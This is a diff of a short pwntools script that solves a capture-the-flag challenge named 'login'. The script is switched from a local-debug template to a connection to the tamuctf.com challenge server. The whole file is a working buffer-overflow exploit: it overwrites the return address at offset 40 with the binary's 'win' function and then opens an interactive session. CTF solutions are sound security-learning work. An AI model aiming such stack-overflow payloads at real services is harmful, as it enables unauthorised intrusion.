@@ -1,34 +1,14 @@
-#!/usr/bin/env python3
-
 from pwn import *
 
-exe = ELF("login")
+CHAL = "login"
 
+exe = ELF("./login")
+p = remote("tamuctf.com", 443, ssl=True, sni=CHAL)
 
-context.binary = exe
-context.terminal = "kitty"
-def conn():
-    if args.REMOTE:
-        return remote("localhost", 7000)
-    elif args.GDB:
-        return gdb.debug(exe.path)
-    else:
-        return process(exe.path)
+payload = flat({
+    40: exe.symbols['win'],
+})
+p.sendline(payload)
+p.sendline(b"")
 
-
-def main():
-    r = conn()
-
-    payload = flat({
-        40: exe.symbols['win'],
-    })
-    r.sendline(payload)
-    r.sendline(b"")
-
-    # good luck pwning :)
-
-    r.interactive()
-
-
-if __name__ == "__main__":
-    main()
+p.interactive()
